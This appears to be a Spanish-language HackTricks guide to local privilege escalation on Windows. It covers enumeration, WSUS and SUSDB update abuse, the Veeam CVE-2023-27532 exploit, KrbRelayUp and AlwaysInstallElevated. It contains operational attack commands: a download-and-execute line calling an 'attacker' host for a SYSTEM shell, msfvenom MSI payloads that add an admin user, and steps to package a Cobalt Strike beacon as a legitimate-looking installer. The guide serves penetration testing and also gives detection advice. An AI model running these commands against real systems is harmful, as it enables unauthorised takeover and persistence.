# Escalada de privilegios local en Windows

{{#include ../../banners/hacktricks-training.md}}

### **La mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Esta página reúne una metodología general de escalada de privilegios en Windows a partir de varias guías fundamentales.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Su flujo práctico de enumeración también se basa en talleres y listas de comprobación de la comunidad.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> El material histórico sobre ataques incluye la presentación de DerbyCon sobre escalada de privilegios en Windows.<sup>[[5]](#references)</sup>

## Fundamentos iniciales de Windows

### Tokens de acceso

**Si no sabes qué son los tokens de acceso de Windows, lee la siguiente página antes de continuar:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL: DACL/SACL/ACE

**Consulta la siguiente página para obtener más información sobre ACL: DACL/SACL/ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows, lee la siguiente página antes de continuar:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de seguridad de Windows

En Windows hay distintos elementos que podrían **impedirte enumerar el sistema**, ejecutar archivos binarios o incluso **detectar tus actividades**. Debes **leer** la siguiente **página** y **enumerar** todos estos **mecanismos** de **defensa** antes de empezar la enumeración para la escalada de privilegios:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

El acceso físico también puede convertir una modificación offline de UEFI NVRAM en una cadena de DMA durante el arranque y de parcheo de memoria de Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Protección de administrador / elevación silenciosa de UIAccess

Se puede abusar de los procesos UIAccess iniciados mediante `RAiLaunchAdminProcess` para alcanzar High IL sin avisos cuando se omiten las comprobaciones de ruta segura de AppInfo. Consulta aquí el flujo dedicado para omitir UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Se puede abusar de la propagación del registro de accesibilidad de Secure Desktop para escribir de forma arbitraria en el registro como SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Las versiones recientes de Windows también introdujeron una vía de LPE mediante **SMB en un puerto arbitrario**, que refleja una autenticación NTLM local privilegiada a través de una conexión TCP de SMB reutilizada:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Información del sistema

### Enumeración de información de versión

Comprueba si la versión de Windows tiene vulnerabilidades conocidas (comprueba también los parches aplicados).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits de versión

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre las vulnerabilidades de seguridad de Microsoft. Esta base de datos contiene más de 4.700 vulnerabilidades de seguridad, lo que muestra la **enorme superficie de ataque** que presenta un entorno Windows.

**En el sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventaría la compilación del sistema operativo, las actualizaciones instaladas y posibles avisos relevantes; verifica el producto exacto y las actualizaciones posteriores antes de considerar aplicable un resultado.

Para un exploit local específico de una versión, comprueba la **arquitectura del proceso en ejecución**, además de la arquitectura del sistema operativo. En Windows de 64 bits, un proceso de 32 bits está sujeto a la [redirección del sistema de archivos de WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` normalmente apunta al directorio del sistema de 32 bits, mientras que `%windir%\Sysnative` permite que ese proceso acceda al directorio del sistema nativo. Este alias no está disponible para un proceso de 64 bits. La compilación del sistema operativo o la posible ausencia de una KB no demuestra que el sistema sea vulnerable; compara la compilación en ejecución, las actualizaciones instaladas o posteriores, la arquitectura del proceso y los requisitos previos del exploit con el [boletín de seguridad de Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) correspondiente al problema exacto.

**Localmente con información del sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de exploits en Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Hay credenciales o información jugosa guardadas en las variables de entorno?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historial de PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Archivos de transcripción de PowerShell

Puedes aprender a habilitar esto en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` es solo un ejemplo. La [directiva de transcripción de PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalmente escribe en la carpeta Documentos de cada usuario, pero una configuración `OutputDirectory` o `Start-Transcript -OutputDirectory` puede redirigir los archivos a una carpeta compartida u oculta. Comprueba la ruta de salida efectiva y la ACL del archivo antes de revisar una transcripción: puede contener argumentos de comandos y resultados, incluidas credenciales. Una transcripción legible solo es una pista si su contenido revela una identidad utilizable con mayores privilegios y esa identidad puede iniciar sesión en el contexto pertinente.

### PowerShell Module Logging

Se registran detalles de las ejecuciones del pipeline de PowerShell, incluidos los comandos ejecutados, las invocaciones de comandos y partes de los scripts. Sin embargo, es posible que no se capturen todos los detalles de la ejecución ni los resultados de salida.

Para habilitarlo, sigue las instrucciones de la sección "Transcript files" de la documentación y elige **"Module Logging"** en lugar de **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Para ver los últimos 15 eventos de los registros de PowersShell, puedes ejecutar:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Se captura un registro completo de la actividad y de todo el contenido de la ejecución del script, lo que garantiza que cada bloque de código quede documentado mientras se ejecuta. Este proceso conserva un registro de auditoría exhaustivo de cada actividad, útil para el análisis forense y el análisis de comportamientos maliciosos. Al documentar toda la actividad en el momento de la ejecución, se obtiene información detallada sobre el proceso.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Los eventos de registro de Script Block se pueden encontrar en el Visor de eventos de Windows, en la ruta: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para ver los últimos 20 eventos, puedes usar:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Configuración de Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Unidades

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Un endpoint HTTP de WSUS es una pista para investigar la interceptación de metadatos de actualización. La explotación también depende de si el cliente usa ese servidor WSUS, de si un atacante puede interceptar o controlar su tráfico y de las políticas de confianza e instalación de actualizaciones del cliente. La URL por sí sola no demuestra que se pueda ejecutar código. [Microsoft recomienda TLS para los metadatos de WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Para empezar, comprueba si la red usa una actualización de WSUS que no emplea SSL, ejecutando lo siguiente en cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

O lo siguiente en PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Si recibes una respuesta como una de estas:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` es igual a `1`.

Cuando `UseWUServer` es `1`, Windows Update utiliza el servicio de intranet configurado. Esto confirma un requisito previo para la vía de interceptación HTTP, pero no demuestra que sea posible interceptar el tráfico, aceptar actualizaciones maliciosas o instalarlas con privilegios elevados. Cuando es `0`, esa política no selecciona este endpoint de WSUS configurado.

Para explotar estas vulnerabilidades, puedes usar herramientas como [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus): son scripts de exploits armados para MiTM que inyectan actualizaciones «falsas» en el tráfico WSUS no SSL.

Lee la investigación aquí:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lee el informe completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Básicamente, este es el fallo que explota este bug:

> Si tenemos la capacidad de modificar el proxy de nuestro usuario local, y Windows Updates usa el proxy configurado en los ajustes de Internet Explorer, entonces podemos ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como usuario con privilegios elevados en nuestro equipo.
>
> Además, como el servicio WSUS utiliza los ajustes del usuario actual, también utiliza su almacén de certificados. Si generamos un certificado autofirmado para el nombre de host de WSUS y lo agregamos al almacén de certificados del usuario actual, podremos interceptar el tráfico WSUS tanto HTTP como HTTPS. WSUS no usa mecanismos similares a HSTS para implementar una validación de confianza en el primer uso del certificado. Si el certificado presentado es de confianza para el usuario y tiene el nombre de host correcto, el servicio lo aceptará.

Puedes explotar esta vulnerabilidad con la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (cuando se publique).

### Actualizaciones controladas por administradores de WSUS

Existe una vía distinta cuando la identidad actual puede **publicar y aprobar** actualizaciones en un servidor WSUS. Comprueba la pertenencia efectiva al grupo `WSUS Administrators` del servidor y los permisos delegados de WSUS; luego identifica el grupo de equipos cliente que recibiría una actualización aprobada. [Microsoft exige privilegios de administrador de WSUS para aprobar actualizaciones](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) y [documenta la relación de confianza de publicación](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): los clientes deben confiar en el certificado de firma usado para el contenido publicado localmente. Antes de considerar esto una vía de escalada, confirma que la actualización candidata está firmada y es aceptada, que se aplica al objetivo y que se instala en un contexto con más privilegios. Un valor HTTP `WUServer` o un nombre de grupo, por sí solos, no demuestran que se cumplan esas condiciones.

### Abuso de actualizaciones personalizadas de SUSDB: payloads sin firmar mediante `.txt`/`.esd`

Este es un fallo distinto en el límite de confianza respecto a interceptar una conexión WSUS HTTP: el requisito previo es tener suficiente acceso a los **procedimientos almacenados de la base de datos WSUS (`SUSDB`)** para publicar y aprobar una actualización personalizada. Una posible vía de acceso consiste en retransmitir la cuenta de equipo de WSUS ascendente a un servidor MSSQL independiente que aloje `SUSDB`; el requisito exacto depende del despliegue, así que primero enumera los permisos `EXECUTE` en lugar de dar por sentado que se tienen derechos de administrador de SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Para conocer la vía de ataque independiente que retransmite la autenticación de clientes WSUS desde HTTP/8530 a LDAP, SMB o AD CS, consulta [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Crear, asignar como objetivo y aprobar la actualización

El flujo de trabajo de actualización personalizada usa procedimientos legítimos de WSUS como una API de publicación restringida. Las transiciones de estado importantes son:<sup>[[38]](#references)</sup>

| Etapa | Procedimientos almacenados relevantes |
| --- | --- |
| Importar metadatos de actualización | `spImportUpdate` |
| Almacenar fragmentos XML de requisitos previos, localizados y extendidos | `spSaveXMLFragment` |
| Asociar el resumen criptográfico del contenido con su URL controlada por el atacante | `spSetBatchURL` |
| Enumerar/crear un grupo de equipos y agregar el cliente | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Aprobar la instalación para ese grupo | `spDeployUpdate` con `@actionID = 0` y `@isAssigned = 1` |

El nombre del archivo, los resúmenes criptográficos, el tamaño y el controlador `CommandLineInstallation` deben coincidir en los metadatos y los fragmentos importados. Después de asignar la URL del contenido y el grupo objetivo, la aprobación final se parece a lo siguiente; usa identificadores de actualización, grupo y despliegue nuevos, en lugar de reutilizar GUID de ejemplo.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass de firma basado en la extensión

WSUS normalmente rechaza contenido ejecutable arbitrario sin firmar. Sin embargo, en `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, la ruta .NET `VerifyFile` establece en false la marca de comprobación del certificado cuando el nombre de archivo proporcionado termina en `.txt` o `.esd`; entonces se omite `CheckCertificateSignature` sin comprobar antes que los bytes sean texto o una imagen ESD legítima. Por lo tanto, un PE sin modificar llamado, por ejemplo, `payload.exe.txt` puede superar la verificación del contenido y luego ser ejecutado por el controlador de instalación de línea de comandos de la actualización. Se trata de un error de confusión de políticas y tipos, no de una falsificación de firma.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging y automatización compatibles con BITS

Al llamar a `spDeployUpdate`, WSUS obtiene el contenido registrado. El origen debe cumplir las expectativas HTTP de BITS: no basta con que la URL sea accesible, ya que la transferencia usa un flujo inicial de `HEAD`/`GET` y solicitudes de rangos de bytes. Un servidor sin compatibilidad con Range genera el evento de sincronización de WSUS `EventId=364`, que indica que BITS requiere el encabezado de protocolo Range.<sup>[[39]](#references)</sup>

El PoC de investigación [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera el SQL necesario para la cadena de importación/fragmento/URL/grupo/despliegue, incluye un cliente MSSQL modificado para ejecutarlo y proporciona `BitsWebServer.py` para preparar el contenido. Una invocación mínima para un laboratorio autorizado es:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Ejecución desatendida y persistencia mediante reintentos

La interacción del cliente depende de la directiva. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opción `4 - Auto download and schedule install`, hace que una actualización aprobada se descargue e instale según el horario configurado, sin que el usuario tenga que seleccionarla manualmente. Durante las pruebas, una carga cuyo estado de actualización seguía siendo fallido/incompleto volvió a ofrecerse inmediatamente después de que saliera el proceso de callback, por lo que el comportamiento de reintento puede convertirse en persistencia mediante ejecución recurrente; genera ruido porque el cliente muestra un estado de actualización fallida.<sup>[[39]](#references)</sup>

#### Detección y medidas de hardening

Algunos pivotes útiles del lado del servidor y del cliente para esta cadena son:<sup>[[39]](#references)</sup>

- Audita la ejecución de `spCreateTargetGroup`, `spSetBatchURL` y `spDeployUpdate` en `SUSDB`; investiga nuevos grupos de destino, orígenes de contenido externos, payloads de actualización `.txt`/`.esd` y despliegues realizados por principales inesperados (especialmente cuentas que no sean de equipo).
- Revisa `C:\Program Files\Update Services\LogFiles` en busca de `ContentSyncAgent`, `FileVerified`, el error tipográfico `FileVerficationFailed` y `EventId=364`; correlaciona la verificación con la extensión del payload y el magic del contenido, en lugar de confiar en el sufijo.
- Busca instalaciones de Windows Update que fallen y se reintenten repetidamente, así como la ejecución de PE o actividad inesperada de procesos secundarios/de red originada en contenido con nombres `.txt` o `.esd`.
- Exige Extended Protection for Authentication en el servicio de base de datos cuando sea compatible y restringe el acceso de red a la base de datos al servidor WSUS y a los sistemas administrativos autorizados. Minimiza y audita los permisos `EXECUTE` en los procedimientos de actualización personalizados.

## Actualizadores automáticos de terceros e IPC de agentes (local privesc)

Muchos agentes empresariales exponen una superficie de IPC en localhost y un canal de actualización con privilegios. Si se puede forzar el registro para que se conecte a un servidor del atacante y el actualizador confía en una rogue root CA o aplica comprobaciones débiles del firmante, un usuario local puede entregar un MSI malicioso que el servicio SYSTEM instala. Consulta aquí una técnica generalizada (basada en la cadena Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM mediante TCP 9401)

Veeam Backup & Replication y Cloud Connect utilizan un servicio central de backup en **TCP/9401 de forma predeterminada**. [El aviso de Veeam](https://www.veeam.com/kb4424) describe la divulgación no autenticada de credenciales cifradas de la base de datos de configuración dentro del perímetro de red del backup; un PoC público independiente demuestra una vía de ejecución de comandos como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> El servicio puede enlazarse a direcciones distintas de localhost, así que comprueba su dirección real y su PID.

- **Recon**: confirma que TCP/9401 corresponde a `Veeam.Backup.Service.exe` y, después, inspecciona el producto instalado y los metadatos de los parches. `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` son pistas, no una comprobación completa de parches.
- **Versiones mínimas corregidas**: Veeam indica **11a build 11.0.1.1261 P20230227** y **12 build 12.0.0.1420 P20230223** como las primeras versiones corregidas; las versiones anteriores están afectadas. Un número de versión de archivo de cuatro partes por sí solo no permite distinguir una build base sin parche de un parche posterior aplicado sobre esos mismos números de build. Verifica el identificador del parche en el [historial de builds del proveedor](https://www.veeam.com/kb2680) antes de considerar corregida una build límite.
- **Exploit**: coloca un PoC como `VeeamHax.exe` junto con las DLL de Veeam requeridas en el mismo directorio y, luego, activa un payload SYSTEM a través del socket local:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

El PoC citado demuestra la ejecución de comandos como SYSTEM cuando se cumplen sus requisitos adicionales; el aviso del proveedor describe el problema de divulgación de credenciales.
## KrbRelayUp

Un relay local de Kerberos puede pasar de un inicio de sesión con menos privilegios a una escritura privilegiada en el directorio cuando un servidor COM adecuado se autentica y la entidad reenviada tiene permisos sobre el objeto de destino. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) tanto escrituras LDAP de RBCD como de `msDS-KeyCredentialLink` (shadow credential); KrbRelayUp automatiza algunas de estas vías. Una cadena RBCD requiere delegación aplicable y permisos sobre el objeto de destino, mientras que una cadena de shadow credential requiere permisos de escritura de claves y un KDC que admita la vía de autenticación con certificados. Ninguna de las dos vías se deriva únicamente de pertenecer al dominio.

Comprueba la política del DC real para [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) y [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), la ACL del objeto de la identidad reenviada y los niveles de autenticación e impersonación de la clase COM seleccionada. El tipo de inicio de sesión y el contexto de credenciales del llamante son importantes: una sesión de WinRM puede comportarse de manera distinta a un inicio de sesión interactivo o con nuevas credenciales. El enrutamiento del firewall/OXID y las actualizaciones instaladas también pueden cambiar el resultado. Trata una política permisiva o una ACL coincidente como aspectos que deben revisarse; la enumeración pasiva no debería activar coerción COM, autenticación relay ni escrituras en el directorio. Una shadow credential de una cuenta de equipo puede llevar a un ticket de equipo y, solo si esa cuenta tiene los permisos de replicación del directorio necesarios, a una vía DCSync independiente.

Encuentra el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para obtener más información sobre el flujo del ataque, consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Si** estas 2 claves del Registro están **habilitadas** (el valor es **0x1**), los usuarios con cualquier nivel de privilegios pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Payloads de Metasploit

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Si tienes una sesión de meterpreter, puedes automatizar esta técnica usando el módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa el comando `Write-UserAddMSI` de power-up para crear en el directorio actual un binario MSI de Windows para escalar privilegios. Este script genera un instalador MSI precompilado que solicita agregar un usuario o grupo (por lo que necesitarás acceso GIU):

```
Write-UserAddMSI
```

Solo ejecuta el binario creado para escalar privilegios.

### MSI Wrapper

Lee este tutorial para aprender a crear un MSI wrapper con esta herramienta. Ten en cuenta que puedes envolver un archivo "**.bat**" si **solo** quieres **ejecutar** **líneas de comandos**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Crear un MSI con WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Crear un MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuevo payload TCP de Windows EXE** en `C:\privesc\beacon.exe`
- Abre **Visual Studio**, selecciona **Create a new project** y escribe "installer" en el cuadro de búsqueda. Selecciona el proyecto **Setup Wizard** y haz clic en **Next**.
- Asigna un nombre al proyecto, por ejemplo **AlwaysPrivesc**, usa **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory** y haz clic en **Create**.
- Haz clic en **Next** hasta llegar al paso 3 de 4 (elegir los archivos que se incluirás). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Luego, haz clic en **Finish**.
- Resalta el proyecto **AlwaysPrivesc** en el **Solution Explorer** y, en **Properties**, cambia **TargetPlatform** de **x86** a **x64**.
  - Puedes cambiar otras propiedades, como **Author** y **Manufacturer**, para que la aplicación instalada parezca más legítima.
- Haz clic derecho en el proyecto y selecciona **View > Custom Actions**.
- Haz clic derecho en **Install** y selecciona **Add Custom Action**.
- Haz doble clic en **Application Folder**, selecciona el archivo **beacon.exe** y haz clic en **OK**. Esto garantiza que el payload Beacon se ejecute en cuanto se inicie el instalador.
- En **Custom Action Properties**, cambia **Run64Bit** a **True**.
- Por último, **compílalo**.
  - Si aparece la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrate de que la plataforma esté configurada en x64.

### Instalación de MSI

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always_install_elevated_

## Antivirus y detectores

### Configuración de auditoría

Estos ajustes determinan qué se **registra**, así que debes prestar atención.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: es interesante saber adónde se envían los registros.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** está diseñado para la **gestión de las contraseñas de Administrator locales**, y garantiza que cada contraseña sea **única, aleatoria y se actualice con regularidad** en los equipos unidos a un dominio. Estas contraseñas se almacenan de forma segura en Active Directory y solo pueden acceder a ellas los usuarios a quienes se hayan concedido permisos suficientes mediante ACLs, lo que les permite ver las contraseñas de administrador local si están autorizados.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más información sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Protección de LSA

A partir de **Windows 8.1**, Microsoft introdujo una protección mejorada para la Autoridad de seguridad local (LSA) para **bloquear** los intentos de procesos no confiables de **leer su memoria** o inyectar código, lo que protege aún más el sistema.\
[**Más información sobre la protección de LSA aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** se introdujo en **Windows 10**. Su propósito es proteger las credenciales almacenadas en un dispositivo contra amenazas como los ataques pass-the-hash. [**Aquí encontrarás más información sobre Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Credenciales almacenadas en caché

Las **credenciales de dominio** son autenticadas por la **Local Security Authority** (LSA) y utilizadas por los componentes del sistema operativo. Cuando los datos de inicio de sesión de un usuario son autenticados por un paquete de seguridad registrado, normalmente se establecen las credenciales de dominio del usuario.\
[**Más información sobre las credenciales almacenadas en caché aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Usuarios y grupos

### Enumerar usuarios y grupos

Debes comprobar si alguno de los grupos a los que perteneces tiene permisos interesantes.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, es posible que puedas escalar privilegios**. Aprende aquí sobre los grupos privilegiados y cómo abusar de ellos para escalar privilegios:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulación de tokens

**Aprende más** sobre qué es un **token** en esta página: [**Tokens de Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la siguiente página para **aprender sobre tokens interesantes** y cómo abusar de ellos:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuarios conectados / Sesiones

```bash
qwinsta
klist sessions
```

### Carpetas personales

